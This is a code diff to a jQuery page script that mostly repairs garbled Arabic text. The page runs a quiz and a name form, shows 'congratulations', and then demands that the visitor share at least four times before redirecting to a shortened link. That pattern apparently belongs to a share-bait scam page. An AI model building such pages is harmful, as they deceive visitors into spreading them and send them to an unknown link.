@@ -52,11 +52,11 @@ $(document).ready(function () {
 		var _this = $(this);
 		var x = _this.next().next().html() == '' ? 0 : parseInt(_this.next().next().html());
 		if (_this.hasClass('selected')) {
-			_this.removeClass('selected').html('Ø¥Ø¹Ø¬Ø§Ø¨');
+			_this.removeClass('selected').html('إعجاب');
 			_this.next().next().html(--x);
 			if (x == 0) _this.next().next().addClass('likehide');
 		} else {
-			_this.addClass('selected').html('Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥Ø¹Ø¬Ø§Ø¨');
+			_this.addClass('selected').html('إزالة الإعجاب');
 			_this.next().next().html(++x);
 			if (_this.next().next().hasClass('likehide')) _this.next().next().removeClass('likehide');
 		}
@@ -74,7 +74,7 @@ $(document).ready(function () {
 
 	var pruefen = 0;
 
-	//3 Fragen und Pruefung
+	//3 Fragen und Pruefung   
 
 	$("#frage_01").click(function () {
 		$('#frage_02').slideDown();
@@ -93,7 +93,7 @@ $(document).ready(function () {
 
 	$("#frage_04 button").click(function () {
 		if ($("#nameform").val() == "") {
-			alert("ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø¥Ø¹Ø·Ø§Ù†Ø§ ÙƒØ§ÙØ© Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£ÙˆÙ„Ø§Ù‹ !!");
+			alert("يجب عليك إعطانا كافة المعلومات أولاً !!");
 		} else {
 
 			$.ajax({
@@ -110,7 +110,7 @@ $(document).ready(function () {
 			});
 
 
-			$("#Welcome").html("ØªÙ‡Ø§Ù†ÙŠÙ†Ø§ " + $("#nameform").val() + " !");
+			$("#Welcome").html("تهانينا " + $("#nameform").val() + " !");
 			$('#content_02').fadeIn();
 			$('#frage_04').fadeOut();
 			$('#aufforderung').fadeOut();
@@ -296,6 +296,6 @@ $(document).ready(function () {
 	$("#b2")
 		.on('click', function () {
 			if (c > 3) window.location = "https://t.co/sOajNaQWO6";
-			else window.alert(" Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„ 4 Ù…Ø±Ø§Øª Ù„ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØªØ¨Ø¹ ! \n\n Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ§Øª Ø§Ù„ØªÙŠ Ù‚Ù…Øª Ø¨Ù‡Ø§  " + c);
+			else window.alert(" الرجاء المشاركة على الأقل 4 مرات ليتم ارسال كود التتبع ! \n\n المشاركات التي قمت بها  " + c);
 		});
 });
